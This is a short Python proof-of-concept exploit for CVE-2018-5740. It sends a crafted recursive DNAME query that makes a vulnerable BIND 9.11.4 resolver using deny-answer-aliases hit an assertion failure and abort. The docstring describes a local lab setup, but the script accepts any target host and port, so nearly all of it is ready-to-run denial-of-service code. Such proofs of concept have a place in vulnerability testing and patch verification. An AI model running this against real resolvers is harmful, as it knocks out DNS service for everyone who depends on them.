#!/usr/bin/env python3
"""
PoC: CVE-2018-5740 - BIND 9.11.4 assertion failure via deny-answer-aliases.

The victim is the recursive resolver on UDP/5056. It has
`deny-answer-aliases { "dname.example.com"; }` and forwards example.com to a
loopback authoritative server (UDP/53) that serves a DNAME at dname.example.com.
A recursive query for that DNAME drives named into the broken deny-answer-aliases
path:  name.c:2117: REQUIRE(suffixlabels > 0) failed -> abort().

Send a DNAME query, with recursion desired (RD=1), for dname.example.com.
"""

import socket
import struct
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5056

# DNS header: id=0x1234, flags=0x0100 (RD set), QD=1.
hdr = struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
# QNAME dname.example.com, QTYPE=DNAME(39), QCLASS=IN(1)
qname = b"\x05dname\x07example\x03com\x00"
qry = qname + struct.pack(">HH", 39, 1)

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)
s.sendto(hdr + qry, (HOST, PORT))
try:
    data, _ = s.recvfrom(4096)
    print(f"[*] got {len(data)} byte response (resolver may abort on next/this query)")
except socket.timeout:
    print("[*] no response (resolver likely aborted on the deny-answer-aliases path)")
finally:
    s.close()
